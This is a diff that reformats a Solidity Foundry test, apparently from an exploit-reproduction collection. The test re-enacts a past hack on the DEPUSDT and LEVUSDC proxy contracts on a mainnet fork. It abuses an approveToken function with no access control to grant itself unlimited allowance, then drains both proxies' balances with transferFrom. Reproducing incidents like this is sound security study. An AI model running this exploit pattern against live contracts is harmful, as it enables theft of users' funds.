@@ -19,11 +19,7 @@ interface IProxy {
 interface IToken {
     function balanceOf(address who) external view returns (uint256);
 
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external;
+    function transferFrom(address sender, address recipient, uint256 amount) external;
 }
 
 contract ContractTest is Test {
@@ -34,7 +30,7 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17484161);
+        cheats.createSelectFork("mainnet", 17_484_161);
         cheats.label(address(DEPUSDT), "DEPUSDT");
         cheats.label(address(LEVUSDC), "LEVUSDC");
         cheats.label(address(ProxyDEPUSDT), "ProxyDEPUSDT");
@@ -43,42 +39,18 @@ contract ContractTest is Test {
 
     function testApprove() public {
         // No access controll. Thanks to this, attacker obtained authorization to transfer funds
-        ProxyDEPUSDT.approveToken(
-            address(DEPUSDT),
-            address(this),
-            type(uint256).max
-        );
+        ProxyDEPUSDT.approveToken(address(DEPUSDT), address(this), type(uint256).max);
 
-        DEPUSDT.transferFrom(
-            address(ProxyDEPUSDT),
-            address(this),
-            DEPUSDT.balanceOf(address(ProxyDEPUSDT))
-        );
+        DEPUSDT.transferFrom(address(ProxyDEPUSDT), address(this), DEPUSDT.balanceOf(address(ProxyDEPUSDT)));
 
-        cheats.roll(17484167);
+        cheats.roll(17_484_167);
 
-        ProxyLEVUSDC.approveToken(
-            address(LEVUSDC),
-            address(this),
-            type(uint256).max
-        );
+        ProxyLEVUSDC.approveToken(address(LEVUSDC), address(this), type(uint256).max);
 
-        LEVUSDC.transferFrom(
-            address(ProxyLEVUSDC),
-            address(this),
-            LEVUSDC.balanceOf(address(ProxyLEVUSDC))
-        );
+        LEVUSDC.transferFrom(address(ProxyLEVUSDC), address(this), LEVUSDC.balanceOf(address(ProxyLEVUSDC)));
 
-        emit log_named_decimal_uint(
-            "Attacker DEPUSDT balance after hack",
-            DEPUSDT.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("Attacker DEPUSDT balance after hack", DEPUSDT.balanceOf(address(this)), 6);
 
-        emit log_named_decimal_uint(
-            "Attacker LEVUSDC balance after hack",
-            LEVUSDC.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("Attacker LEVUSDC balance after hack", LEVUSDC.balanceOf(address(this)), 6);
     }
 }
